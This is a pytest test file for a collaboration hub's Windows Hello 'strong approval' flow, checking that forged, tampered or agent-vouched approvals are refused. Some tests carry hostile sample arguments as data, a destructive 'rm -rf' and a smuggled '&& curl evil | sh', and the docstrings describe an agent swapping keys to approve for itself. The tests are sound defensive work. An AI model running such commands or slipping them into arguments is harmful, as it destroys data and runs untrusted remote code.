"""The client half of strong approval (R22b), against the REAL v1 routes.

A live hub (#161's routes, over HTTP) and the real client code; only the human
is replaced. Windows Hello is a software RSA-2048 key behind the same calls the
dispatcher makes (`available`, `open_window`, `public_key`, `enrol`, `prove`),
and the fake still runs `consent_hello`'s own challenge checks. NO TEST MAY
RAISE A REAL PROMPT: `consent_hello._run` fails the test if anything reaches it.

A hand-written fake hub would encode this file's own reading of the API — the
way `method` in the enrolment body passed review once (#151) — so the hub here
is the one the session runs.
"""

from __future__ import annotations

import argparse
import base64
import json
import time
from types import SimpleNamespace

import httpx
import pytest

from collab.client.hub_client import HubError
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from collab import cli, consent_hello
from collab.client import approval as strong
from collab.client.hub_client import HubClient
from collab.protocol import KIND_CHAT, KIND_SYSTEM, Envelope

PREFIX = "/ext/collab/v1/approval"
ARGS = "deploy --to staging; untrusted text"


@pytest.fixture(autouse=True)
def no_real_prompt(monkeypatch):
    def refuse(*a, **kw):
        raise AssertionError("a test reached the real Windows Hello / PowerShell")
    monkeypatch.setattr(consent_hello, "_run", refuse)


class FakeHello:
    """Windows Hello as the dispatcher sees it, with a software key. Records
    every window it was asked to open and every challenge it signed."""

    NotEnrolled = consent_hello.NotEnrolled
    Refused = consent_hello.Refused
    HelloError = consent_hello.HelloError

    def __init__(self, choice="approve"):
        self.keys = {}
        self.windows = []
        self.signed = []
        self.choice = choice

    def available(self):
        return True

    def _spki(self, name):
        return self.keys[name].public_key().public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)

    def _sign(self, name, raw):
        self.signed.append(raw)
        return self.keys[name].sign(raw, padding.PKCS1v15(), hashes.SHA256())

    def public_key(self, name):
        if name not in self.keys:
            raise consent_hello.NotEnrolled("NotFound")
        return self._spki(name)

    def enrol(self, name, challenge):
        raw = consent_hello._challenge32(challenge)
        if name in self.keys:
            raise consent_hello.AlreadyEnrolled("CredentialAlreadyExists")
        self.keys[name] = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        return self.prove(name, challenge)

    def prove(self, name, challenge):
        raw = consent_hello._challenge32(challenge)
        return {"credential_id": name, "algorithm": -257,
                "public_key_spki": consent_hello.b64url(self._spki(name)),
                "proof": {"type": "hello",
                          "signature": consent_hello.b64url(self._sign(name, raw))}}

    def open_window(self, request, fetch_challenge):
        self.windows.append(request)
        if self.choice != "approve":
            return {"choice": self.choice}
        issued = fetch_challenge()
        # The adapter's own checks, unchanged: request, digest, credential,
        # method, shape and a hub challenge's expiry.
        raw, challenge_id, _ = consent_hello._issued(issued, request["credential_id"],
                                                     request["digest"], request["request_id"])
        signature = self._sign(request["credential_id"], raw)
        return {"choice": "approve", "method": "hello", "challenge_id": challenge_id,
                "credential_id": request["credential_id"],
                "proof": {"type": "hello", "signature": consent_hello.b64url(signature)}}


@pytest.fixture
def world(live_server, monkeypatch):
    """alice hosts; bob has a Hello key, past its cooling-off; the hub's clock
    is shifted only to skip that cooling-off — never a human's part."""
    store = live_server["store"]
    bob = store.add_participant("bob", "bob-token")
    offset = [-601]
    live_server["app"].state.approvals.clock = lambda: int(time.time() + offset[0])
    hello = FakeHello()
    monkeypatch.setattr(strong, "_hello", lambda: hello)
    bob_hub = HubClient(live_server["base"], "bob-token")
    alice_hub = HubClient(live_server["base"], live_server["host_token"])
    api = strong.ApprovalClient(bob_hub)
    name = strong.hello_key_name("s_test", bob.id)
    begun = api.enrol_begin("hello")
    api.enrol_finish(begun["challenge_id"], hello.enrol(name, begun["challenge"]))
    offset[0] = 0
    profile = SimpleNamespace(name="bob", participant_id=bob.id, session_id="s_test")
    yield SimpleNamespace(store=store, bob=bob, hello=hello, bob_hub=bob_hub,
                          alice_hub=alice_hub, api=api, profile=profile, key=name,
                          base=live_server["base"], host_token=live_server["host_token"],
                          offset=offset, app=live_server["app"])
    bob_hub.close()
    alice_hub.close()


def _available(monkeypatch):
    """The hub at 8257a05 reports `available:false` until arma's operation
    integration is verified; these tests exercise the routes behind it."""
    monkeypatch.setattr(strong.ApprovalClient, "capabilities", lambda self: {
        "api_version": 1, "available": True, "methods": ["hello", "passkey"],
        "supported_methods": ["hello", "passkey"]})


def _ask(w, *, request_id="sr_abcdef012345", skill="example", args=ARGS, strength="strong"):
    ask = {"id": request_id, "skill": skill, "args": args}
    if strength is not None:
        ask["required_strength"] = strength
    r = httpx.post(w.base + "/ext/collab/v1/messages/by-id",
                   headers={"Collab-Protocol-Major": "2", "Collab-Version": "2.0.0",
                            "Authorization": f"Bearer {w.host_token}"},
                   json={"to_id": w.bob.id, "body": {"skill_request": ask}})
    assert r.status_code == 200, r.text
    return r.json()["seq"]


def _requests(w):
    return cli._skill_requests(w.bob_hub, w.profile)


def _accept(w, match, **flags):
    return cli._accept_strong(w.bob_hub, w.profile, match, argparse.Namespace(**flags))


def _acceptance_events(w):
    return [e for e in w.alice_hub.history(limit=500)
            if (e.body or {}).get("strong_skill_response")]


# --- the whole path ---------------------------------------------------------------


def test_a_strong_request_is_accepted_only_by_the_window_and_the_hubs_receipt(world, monkeypatch):
    """Listed as strong and pending; accepted through the hub's review, one
    gesture over the hub's challenge, the receipt at once to the adopting
    path — and then BOTH sides can see a server-owned acceptance for exactly
    that source event, which is what marks it accepted."""
    _available(monkeypatch)
    seq = _ask(world)
    [match] = _requests(world)
    assert match["strength"] == "strong" and match["state"] == "pending" and match["seq"] == seq

    assert _accept(world, match) == 0
    [window] = world.hello.windows
    # Built from the hub's canonical review, not from the chat event.
    canonical = json.loads(window["review_text"])
    assert canonical["payload"]["args"] == ARGS and canonical["payload"]["source_seq"] == seq
    assert canonical["target_id"] == world.bob.id
    assert len(world.hello.signed) == 2          # the enrolment proof, then this

    deadline = time.monotonic() + 10
    while not _acceptance_events(world) and time.monotonic() < deadline:
        time.sleep(0.1)
    [event] = _acceptance_events(world)
    alice_id = world.store._db.execute(
        "SELECT id FROM participants WHERE name='alice'").fetchone()[0]
    # What the REQUESTER checks: kind system, from bob's id to its own, for
    # exactly the sequence it sent.
    assert event.kind == KIND_SYSTEM
    assert strong.strong_acceptance(event, requester_id=alice_id, target_id=world.bob.id,
                                    source_seq=seq)
    assert strong.strong_acceptance(event, requester_id=alice_id, target_id=world.bob.id,
                                    source_seq=seq + 1) is None
    [after] = _requests(world)
    assert after["state"] == "accepted"


def test_the_window_shows_the_reviewed_digest_and_ids(world, monkeypatch):
    _available(monkeypatch)
    seq = _ask(world)
    [match] = _requests(world)
    assert _accept(world, match) == 0
    [window] = world.hello.windows
    assert len(window["digest"]) == 64 and window["digest"] == window["digest"].lower()
    assert window["requester_id"] == match["from_id"]
    assert window["credential_id"] == world.key
    assert window["authority"] == "skill-request:accept"
    assert window["destination"] == "participant:" + world.bob.id
    assert seq


# --- nothing weaker stands in --------------------------------------------------------


def test_human_approved_never_satisfies_a_strong_request(world, monkeypatch, capsys):
    """`--human-approved` is an agent vouching for a human; the terminal
    prompt is a «y» anybody at the keyboard can type. Neither is a gesture
    the hub verified, so neither may answer a request that asked for one."""
    _available(monkeypatch)
    _ask(world)
    monkeypatch.setattr(cli, "_human_consents",
                        lambda *a: pytest.fail("the legacy consent was consulted"))
    monkeypatch.setattr(cli, "_require_own_profile", lambda args: world.profile)
    monkeypatch.setattr(cli, "_client", lambda profile: HubClient(world.base, "bob-token"))
    args = cli.build_parser().parse_args(["skills", "accept", "sr_abcdef012345",
                                          "--human-approved"])
    assert cli.cmd_skills(args) == 1
    assert "--human-approved cannot satisfy it" in capsys.readouterr().err
    assert world.hello.windows == []
    assert not _acceptance_events(world)


def test_a_chat_saying_accepted_never_marks_a_strong_request_accepted(world, monkeypatch):
    """The legacy reply — a `skill_response` chat, from the receiver itself or
    anyone copying it — carries no verified gesture."""
    seq = _ask(world)
    # Two layers. The hub now refuses the legacy reply to a strong request
    # outright (arma's 4e9e3bd: strong skill policy enforced across
    # transports); and even had it arrived, the client would not count it.
    with pytest.raises(HubError, match="strong approval endpoint"):
        world.bob_hub.send(Envelope(kind=KIND_CHAT, sender="bob", to="alice",
                                    text="accepted your request",
                                    body={"skill_response": {"id": "sr_abcdef012345",
                                                             "state": "accepted", "text": ""}}))
    [match] = _requests(world)
    assert match["state"] == "pending"
    forged = SimpleNamespace(kind=KIND_CHAT, sender_id=world.bob.id, to_id="p_x", body={
        "event": "skill-approval", "strong_skill_response": {
            "state": "accepted", "strength": "strong", "source_seq": seq, "digest": "a" * 64}})
    assert strong.strong_acceptance(forged, requester_id="p_x", target_id=world.bob.id,
                                    source_seq=seq) is None


def test_a_strong_request_is_matched_by_participant_id_never_by_name(world):
    """No name fallback: without a participant id there is no strong request
    to answer at all — a name is a label anybody can take."""
    _ask(world)
    nameless = SimpleNamespace(name="bob", participant_id="", session_id="s_test")
    assert cli._skill_requests(world.bob_hub, nameless) == []


def test_a_malformed_strong_request_is_dropped_not_downgraded(world):
    """It asked for strong approval: a bad strength or an extra key does not
    turn it into an ordinary request a typed «yes» could answer."""
    _ask(world, strength="sort of")
    assert _requests(world) == []


# --- checked before any window -------------------------------------------------------


@pytest.mark.parametrize("tamper", [
    lambda r: r.update(digest="0" * 64),
    lambda r: r["review"]["payload"].update(args="something else"),
    lambda r: r.update(canonical_review=consent_hello.b64url(
        json.dumps({**r["review"], "target_id": "p_someone"}, sort_keys=True,
                   separators=(",", ":")).encode())),
    lambda r: r.update(required_strength="weak"),
    lambda r: r.update(request_id="ar_other"),
])
def test_no_window_opens_for_a_review_that_does_not_match(world, monkeypatch, tamper):
    """The digest is recomputed from the canonical bytes and must agree with
    `prepare` and the review; the canonical review must name this participant,
    the source's sender, this source sequence and its exact arguments."""
    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)
    real = strong.ApprovalClient.review

    def tampered(self, request_id):
        answer = real(self, request_id)
        tamper(answer)
        return answer

    monkeypatch.setattr(strong.ApprovalClient, "review", tampered)
    assert _accept(world, match) == 1
    assert world.hello.windows == []


def test_a_hub_that_does_not_offer_strong_approval_opens_no_window(world):
    """At 8257a05 the hub reports `available:false`: a strong request then
    cannot be accepted at all, and nothing weaker is offered instead."""
    _ask(world)
    [match] = _requests(world)
    assert _accept(world, match) == 1
    assert world.hello.windows == []


def test_a_key_in_its_cooling_off_is_refused_before_the_window(world, monkeypatch, capsys):
    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)
    keys = strong.ApprovalClient.keys
    monkeypatch.setattr(strong.ApprovalClient, "keys", lambda self: [
        k | {"usable_at": time.time() + 300} for k in keys(self)])
    assert _accept(world, match) == 1
    assert "cooling-off" in capsys.readouterr().err
    assert world.hello.windows == []


# --- the outcomes ----------------------------------------------------------------


def test_declining_in_the_window_declines_at_the_hub_and_tells_the_requester(world, monkeypatch):
    _available(monkeypatch)
    _ask(world)
    world.hello.choice = "decline"
    [match] = _requests(world)
    assert _accept(world, match) == 0
    [after] = _requests(world)
    assert after["state"] == "declined"
    row = world.store._db.execute("SELECT state FROM approval_requests").fetchone()
    assert row[0] == "declined"


def test_an_expired_or_unavailable_window_accepts_and_declines_nothing(world, monkeypatch):
    _available(monkeypatch)
    _ask(world)
    world.hello.choice = "expired"
    [match] = _requests(world)
    assert _accept(world, match) == 1
    assert _requests(world)[0]["state"] == "pending"
    assert world.store._db.execute("SELECT state FROM approval_requests").fetchone()[0] == "pending"


def test_a_lost_acceptance_answer_is_reconciled_never_retried_blind(world, monkeypatch):
    """The receipt is single-use and lives 120 s. A lost answer to `accept` is
    settled by reading the hub's durable state, not by sending it again."""
    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)
    real = strong.ApprovalClient.skills_accept
    sent = []

    def lost(self, request_id, receipt):
        sent.append(receipt)
        real(self, request_id, receipt)
        raise strong.Uncertain("connection reset")

    monkeypatch.setattr(strong.ApprovalClient, "skills_accept", lost)
    assert _accept(world, match) == 0
    assert len(sent) == 1


def test_the_hubs_error_code_reaches_the_client_intact(world):
    with pytest.raises(strong.ApprovalRefused) as raised:
        world.api.review("ar_nonexistent")
    assert raised.value.code == "unknown_request" and raised.value.status == 404


# --- enrolment ---------------------------------------------------------------------


def _consent(w, monkeypatch, *, tty=True, answer="y"):
    monkeypatch.setattr(cli, "_require_own_profile", lambda args: w.profile)
    monkeypatch.setattr(cli, "_client", lambda profile: HubClient(w.base, "bob-token"))
    monkeypatch.setattr(cli.sys.stdin, "isatty", lambda: tty)
    monkeypatch.setattr(cli.sys.stdout, "isatty", lambda: tty)
    monkeypatch.setattr("builtins.input", lambda prompt="": answer)
    return cli.cmd_consent(cli.build_parser().parse_args(["consent", "enrol"]))


def test_enrolment_is_started_only_by_a_human_at_a_terminal(live_server, monkeypatch, capsys):
    """An agent that could enrol a key could approve with it: without a
    terminal on both ends nothing reaches the hub, and there is no flag that
    vouches for a human."""
    bob = live_server["store"].add_participant("bob", "bob-token")
    hello = FakeHello()
    monkeypatch.setattr(strong, "_hello", lambda: hello)
    with HubClient(live_server["base"], "bob-token") as hub:
        w = SimpleNamespace(profile=SimpleNamespace(name="bob", participant_id=bob.id,
                                                    session_id="s_test"), bob_hub=hub,
                            base=live_server["base"])
        assert _consent(w, monkeypatch, tty=False) == 1
        assert "your human's to do" in capsys.readouterr().err
        assert hello.keys == {} and strong.ApprovalClient(hub).keys() == []
        with pytest.raises(SystemExit):
            cli.build_parser().parse_args(["consent", "enrol", "--human-approved"])
        assert _consent(w, monkeypatch, answer="n") == 1
        assert strong.ApprovalClient(hub).keys() == []


def test_enrolment_creates_proves_and_registers_one_key(live_server, monkeypatch, capsys):
    """Two gestures — create, then a signature over the hub's enrolment
    challenge — and the hub registers the key as unverified, cooling off. A
    second enrolment is refused: adding a key is a signed key change."""
    bob = live_server["store"].add_participant("bob", "bob-token")
    hello = FakeHello()
    monkeypatch.setattr(strong, "_hello", lambda: hello)
    with HubClient(live_server["base"], "bob-token") as hub:
        w = SimpleNamespace(profile=SimpleNamespace(name="bob", participant_id=bob.id,
                                                    session_id="s_test"), bob_hub=hub,
                            base=live_server["base"])
        assert _consent(w, monkeypatch) == 0
        [key] = strong.ApprovalClient(hub).keys()
        assert key["credential_id"] == strong.hello_key_name("s_test", bob.id)
        assert key["trust"] == "tofu-unverified" and key["usable_at"] > time.time() + 500
        assert len(hello.signed) == 1
        assert _consent(w, monkeypatch) == 1
        assert "signed key change" in capsys.readouterr().err


def test_after_a_host_reset_enrolment_creates_a_fresh_key_under_a_fresh_name(live_server, monkeypatch):
    """arma's review of #172: after the hub machine resets the host's keys, the
    old key stays on record as retired and the hub refuses its name and public
    key. Enrolling again must create a FRESH Hello key under a name the hub has
    never seen — not re-prove the retired one under the base name."""
    from collab.server.approval_store import ApprovalStore
    store = live_server["store"]
    bob = store.add_participant("bob", "bob-token")
    with store._lock, store._db:              # bob is this hub's one host
        store._db.execute("UPDATE participants SET is_host=(id=?)", (bob.id,))
    hello = FakeHello()
    monkeypatch.setattr(strong, "_hello", lambda: hello)
    base = strong.hello_key_name("s_test", bob.id)
    with HubClient(live_server["base"], "bob-token") as hub:
        w = SimpleNamespace(profile=SimpleNamespace(name="bob", participant_id=bob.id,
                                                    session_id="s_test"), bob_hub=hub,
                            base=live_server["base"])
        assert _consent(w, monkeypatch) == 0
        ApprovalStore(live_server["store"], "s_test").reset_host_credentials()
        assert _consent(w, monkeypatch) == 0
        keys = {k["credential_id"]: k["state"] for k in strong.ApprovalClient(hub).keys()}
        assert keys[base] == "retired"
        [fresh] = [name for name, state in keys.items() if state == "active"]
        assert fresh != base and fresh in hello.keys
        assert hello.keys[fresh] is not hello.keys[base]


def test_a_key_left_by_a_cancelled_proof_is_proven_not_replaced(live_server, monkeypatch):
    bob = live_server["store"].add_participant("bob", "bob-token")
    hello = FakeHello()
    name = strong.hello_key_name("s_test", bob.id)
    hello.keys[name] = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    monkeypatch.setattr(strong, "_hello", lambda: hello)
    monkeypatch.setattr(hello, "enrol", lambda *a: pytest.fail("a second key was created"))
    with HubClient(live_server["base"], "bob-token") as hub:
        w = SimpleNamespace(profile=SimpleNamespace(name="bob", participant_id=bob.id,
                                                    session_id="s_test"), bob_hub=hub,
                            base=live_server["base"])
        assert _consent(w, monkeypatch) == 0
        assert [k["credential_id"] for k in strong.ApprovalClient(hub).keys()] == [name]


# --- small rules ---------------------------------------------------------------------


def test_the_hello_key_name_is_per_session_and_participant_and_fits():
    name = strong.hello_key_name("s_0123abcd", "p_0123456789ab")
    assert name == "collab-s_0123abcd-p_0123456789ab" and len(name) <= 64
    with pytest.raises(ValueError):
        strong.hello_key_name("s_x", "p_" + "x" * 80)


def test_a_passkey_key_is_unavailable_here_not_a_lesser_approval():
    assert strong.open_window({}, lambda: {}, method="passkey") == {
        "choice": "unavailable", "reason": "passkey page not integrated"}


def test_ask_strong_sends_exactly_the_hubs_four_keys(world, monkeypatch):
    monkeypatch.setattr(cli, "_require_own_profile",
                        lambda args: SimpleNamespace(name="alice", participant_id="",
                                                     session_id="s_test"))
    monkeypatch.setattr(cli, "_client",
                        lambda profile: HubClient(world.base, world.host_token))
    args = cli.build_parser().parse_args(["skills", "ask", "example", "--to", "bob",
                                          "--strong"])
    assert cli.cmd_skills(args) == 0
    [match] = _requests(world)
    assert match["strength"] == "strong" and match["args"] == ""


# --- the requester's side -------------------------------------------------------------


def _alice(w):
    alice_id = w.store._db.execute("SELECT id FROM participants WHERE name='alice'").fetchone()[0]
    return SimpleNamespace(name="alice", participant_id=alice_id, session_id="s_test")


def _accepted(world, monkeypatch):
    _available(monkeypatch)
    seq = _ask(world)
    [match] = _requests(world)
    assert _accept(world, match) == 0
    deadline = time.monotonic() + 10
    while not _acceptance_events(world) and time.monotonic() < deadline:
        time.sleep(0.1)
    return seq


def test_the_requester_sees_a_strong_acceptance_only_from_the_hubs_event(world, monkeypatch):
    """The requester reads its own requests back (`skills sent`): strong ones
    are accepted only by the hub's system event from the asked participant's
    id to its own, for exactly the sequence and request id it sent. The digest
    is RECOMPUTED: the hub's event now carries the reviewed bytes
    (`canonical_review`, the core's must-fix 2), so the requester checks that
    what was approved is exactly what it asked for."""
    seq = _accepted(world, monkeypatch)
    [item] = cli._skill_requests_sent(world.alice_hub, _alice(world))
    assert item["strength"] == "strong" and item["state"] == "accepted"
    assert item["seq"] == seq and len(item["digest"]) == 64
    assert item["digest_checked"] is True


def test_a_digest_the_requester_can_compute_is_compared(world, monkeypatch):
    """When `requester_digest` can compute the digest, an acceptance carrying
    another is an acceptance of something else — never «accepted»."""
    _accepted(world, monkeypatch)
    [item] = cli._skill_requests_sent(world.alice_hub, _alice(world))
    real = item["digest"]
    monkeypatch.setattr(strong, "requester_digest", lambda env: real)
    [checked] = cli._skill_requests_sent(world.alice_hub, _alice(world))
    assert checked["state"] == "accepted" and checked["digest_checked"] is True
    monkeypatch.setattr(strong, "requester_digest", lambda env: "0" * 64)
    [other] = cli._skill_requests_sent(world.alice_hub, _alice(world))
    assert other["state"] == "mismatch"


def test_a_peers_chat_saying_accepted_leaves_the_requesters_strong_request_pending(world):
    _ask(world)
    # The hub refuses a peer's strong_skill_response outright (server-owned
    # since arma's 4e9e3bd); the requester's own reading stays pending either way.
    with pytest.raises(HubError, match="server-owned"):
        world.bob_hub.send(Envelope(kind=KIND_CHAT, sender="bob", to="alice",
                                    text="accepted",
                                    body={"skill_response": {"id": "sr_abcdef012345",
                                                             "state": "accepted", "text": ""},
                                          "strong_skill_response": {"state": "accepted"}}))
    [item] = cli._skill_requests_sent(world.alice_hub, _alice(world))
    assert item["state"] == "pending"


def test_an_acceptance_for_another_request_id_is_not_this_ones():
    event = SimpleNamespace(kind=KIND_SYSTEM, sender_id="p_bob", to_id="p_alice", body={
        "event": "skill-approval", "strong_skill_response": {
            "id": "sr_000000000000", "state": "accepted", "strength": "strong",
            "source_seq": 7, "digest": "a" * 64}})
    kw = dict(requester_id="p_alice", target_id="p_bob", source_seq=7)
    assert strong.strong_acceptance(event, **kw, request_id="sr_000000000000")
    assert strong.strong_acceptance(event, **kw, request_id="sr_111111111111") is None


def test_both_capability_gates_are_required(world, monkeypatch):
    """`available` and the key's method in `supported_methods`: either one
    missing and a strong request is refused, with nothing weaker offered."""
    _ask(world)
    [match] = _requests(world)
    for caps in ({"available": True, "supported_methods": ["passkey"]},
                 {"available": False, "supported_methods": ["hello", "passkey"]},
                 {"available": "yes", "supported_methods": ["hello"]}):
        monkeypatch.setattr(strong.ApprovalClient, "capabilities",
                            lambda self, c=caps: {"api_version": 1, **c})
        assert _accept(world, match) == 1
    assert world.hello.windows == []


# --- review of #164 -----------------------------------------------------------------


def _security_events(w):
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        found = [e for e in w.alice_hub.history(limit=500)
                 if (e.body or {}).get("event") == "approval-security"
                 and (e.body or {}).get("action") in ("missing", "changed")]
        if found:
            return found
        time.sleep(0.1)
    return []


@pytest.mark.parametrize("state", ["missing", "changed"])
def test_a_key_gone_from_this_machine_raises_the_alarm_and_freezes_it(
        world, monkeypatch, capsys, state):
    """Deleting a Hello key needs no gesture, so an agent can do it — and then
    enrol its own. A key that is gone, or replaced under the same name, is
    REPORTED: the hub freezes the credential and tells the whole session, and
    the human is told plainly. It used to surface as a quiet «unavailable»
    and leave the old key active (review of #164, MUST 1)."""
    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)
    if state == "missing":
        del world.hello.keys[world.key]
    else:
        world.hello.keys[world.key] = rsa.generate_private_key(public_exponent=65537,
                                                               key_size=2048)
    assert _accept(world, match) == 1
    err = capsys.readouterr().err
    assert "SECURITY" in err and "FROZEN" in err
    assert world.hello.windows == [], "a window opened for a key that is not there"
    [key] = world.api.keys()
    assert key["state"] == "frozen"
    [alarm] = _security_events(world)
    assert alarm.kind == KIND_SYSTEM and alarm.body["action"] == state


def test_a_key_lost_during_the_window_is_reported_too(world, monkeypatch, capsys):
    """Gone between the check and the gesture: Hello answers NotEnrolled to
    the signature. The same alarm, not «unavailable»."""
    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)

    def vanish(request, fetch):
        del world.hello.keys[world.key]
        return {"choice": "unavailable", "reason": "NotEnrolled"}

    monkeypatch.setattr(world.hello, "open_window", vanish)
    assert _accept(world, match) == 1
    assert "SECURITY" in capsys.readouterr().err
    assert world.api.keys()[0]["state"] == "frozen"


def _acceptance(review: dict, *, digest: str | None = None, seq: int = 7):
    canonical = json.dumps(review, sort_keys=True, separators=(",", ":")).encode()
    import hashlib
    return SimpleNamespace(
        kind=KIND_SYSTEM, sender_id="p_bob", to_id="p_alice", seq=99, body={
            "event": "skill-approval", "strong_skill_response": {
                "id": "sr_abcdef012345", "state": "accepted", "strength": "strong",
                "source_seq": seq, "request_id": "ar_x",
                "digest": digest or hashlib.sha256(canonical).hexdigest(),
                "canonical_review": consent_hello.b64url(canonical)}})


def _review(**payload):
    base = {"source_seq": 7, "skill_request_id": "sr_abcdef012345", "skill": "example",
            "args": ARGS}
    base.update(payload)
    return {"api_version": 1, "session_id": "s_test", "requester_id": "p_alice",
            "target_id": "p_bob", "subject": "Accept peer skill request",
            "destination": "participant:p_bob", "authority": "skill-request:accept",
            "payload": base}


def _my_request():
    return SimpleNamespace(kind=KIND_CHAT, sender_id="p_alice", to="bob", to_id="p_bob",
                           seq=7, sender="alice", body={"skill_request": {
                               "id": "sr_abcdef012345", "skill": "example", "args": ARGS,
                               "required_strength": "strong"}})


@pytest.mark.parametrize("acceptance, state", [
    (lambda: _acceptance(_review()), "accepted"),
    (lambda: _acceptance(_review(args="rm -rf --everything")), "mismatch"),
    (lambda: _acceptance(_review(skill="other")), "mismatch"),
    (lambda: _acceptance(_review(source_seq=8)), "mismatch"),
    (lambda: _acceptance(_review(), digest="0" * 64), "mismatch"),
    (lambda: _acceptance({**_review(), "requester_id": "p_mallory"}), "mismatch"),
])
def test_the_requester_recomputes_a_carried_review_and_refuses_a_tampered_one(acceptance, state):
    """When the hub's acceptance carries `canonical_review`, the requester
    recomputes its digest and checks it is of the skill, arguments and
    sequence it sent — as the target does before its window. Anything else is
    an acceptance of something else: `mismatch`, never accepted (review of
    #164, MUST 2). Without it the digest is only recorded."""
    events = [_my_request(), acceptance()]
    client = SimpleNamespace(history=lambda limit=500: events)
    me = SimpleNamespace(name="alice", participant_id="p_alice", session_id="s_test")
    [item] = cli._skill_requests_sent(client, me)
    assert item["state"] == state
    if state == "accepted":
        assert item["digest_checked"] is True


def test_the_target_refuses_a_consistent_review_of_other_arguments():
    """G31: a review whose canonical bytes, digest and structure all agree —
    but whose arguments are not the ones the source event carried — is not
    this request's review, and no window opens for it."""
    import hashlib

    source = strong.StrongRequest(seq=7, id="sr_abcdef012345", skill="example", args=ARGS,
                                  requester_id="p_alice", requester_name="alice", ts="")

    def answer_for(review):
        canonical = json.dumps(review, sort_keys=True, separators=(",", ":")).encode()
        digest = hashlib.sha256(canonical).hexdigest()
        return ({"request_id": "ar_x", "required_strength": "strong", "state": "pending",
                 "canonical_review": consent_hello.b64url(canonical), "digest": digest,
                 "review": review},
                {"request_id": "ar_x", "digest": digest, "source_seq": 7})

    answer, prepared = answer_for(_review())
    assert strong.verify_review(answer, prepared=prepared, source=source, me_id="p_bob",
                                session_id="s_test").digest == answer["digest"]
    answer, prepared = answer_for(_review(args=ARGS + " && curl evil | sh"))
    with pytest.raises(strong.Mismatch, match="skill and arguments"):
        strong.verify_review(answer, prepared=prepared, source=source, me_id="p_bob",
                             session_id="s_test")


# --- the window contract agreed with the passkey page ------------------------------------


def test_the_window_request_carries_the_verified_canonical_review_and_expiry(world, monkeypatch):
    """Both legs receive the hub's canonical bytes (already checked against
    the digest) and the request's expiry; the Hello leg ignores them."""
    import hashlib

    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)
    assert _accept(world, match) == 0
    [window] = world.hello.windows
    canonical = consent_hello.unb64url(window["canonical_review"], limit=64 * 1024)
    assert hashlib.sha256(canonical).hexdigest() == window["digest"]
    assert json.loads(canonical) == json.loads(window["review_text"])
    assert type(window["expires_at"]) is int and window["expires_at"] > time.time()


def test_the_fetcher_forwards_a_passkey_origin_into_the_challenge(world, monkeypatch):
    """`fetch_challenge(origin=...)` from the passkey leg reaches the hub's
    `/challenge` body; the Hello leg calls it with nothing and sends none."""
    sent = []
    real = strong.ApprovalClient._call

    def record(self, method, path, body=None):
        if path.endswith("/challenge"):
            sent.append(dict(body))
        return real(self, method, path, body)

    monkeypatch.setattr(strong.ApprovalClient, "_call", record)
    _available(monkeypatch)
    _ask(world)
    [match] = _requests(world)

    def passkey_leg(request, fetch_challenge):
        with pytest.raises(strong.ApprovalRefused):    # a Hello key: the hub refuses an origin
            fetch_challenge(origin="http://localhost:43210")
        return {"status": "unavailable", "reason": "test"}

    monkeypatch.setattr(strong, "PASSKEY", passkey_leg)
    keys = strong.ApprovalClient.keys
    monkeypatch.setattr(strong.ApprovalClient, "keys",
                        lambda self: [k | {"method": "passkey"} for k in keys(self)])
    assert _accept(world, match) == 1
    assert sent == [{"credential_id": world.key, "origin": "http://localhost:43210"}]


@pytest.mark.parametrize("answer, expected", [
    ({"status": "proof-ready", "challenge_id": "c_1", "credential_id": "k",
      "proof": {"type": "webauthn.get", "client_data_json": "x"}},
     {"choice": "approve", "method": "passkey", "challenge_id": "c_1", "credential_id": "k",
      "proof": {"type": "webauthn.get", "client_data_json": "x"}}),
    ({"status": "proof-ready", "challenge_id": "c_1", "credential_id": "k"},
     {"choice": "unavailable", "reason": "BadPasskeyAnswer"}),
    ({"choice": "decline"}, {"choice": "decline"}),
    ({"status": "expired"}, {"choice": "expired"}),
    ("garbage", {"choice": "unavailable", "reason": "BadPasskeyAnswer"}),
])
def test_the_passkey_pages_answer_is_taken_in_the_hello_shapes(answer, expected, monkeypatch):
    """«proof-ready» hands back the untouched proof; this client posts
    /approve itself — the page never does."""
    monkeypatch.setattr(strong, "PASSKEY", lambda request, fetch: answer)
    assert strong.open_window({}, lambda **kw: {}, method="passkey") == expected


@pytest.mark.parametrize("strength, asked", [
    ("strong", True), ("weak", False), ("STRONG", True), (5, True), (None, True),
])
def test_only_an_explicit_weak_request_is_read_the_ordinary_way(strength, asked):
    """The hub registers only «strong». An explicit «weak» is an ordinary
    request; anything else that names a strength is strong-asked, so a
    malformed one is dropped rather than downgraded."""
    env = SimpleNamespace(body={"skill_request": {"id": "sr_123456789abc", "skill": "example",
                                                  "args": "", "required_strength": strength}})
    assert strong.is_strong_ask(env) is asked
    assert strong.is_strong_ask(SimpleNamespace(body={"skill_request": {"id": "sr_123456789abc"}})) is False
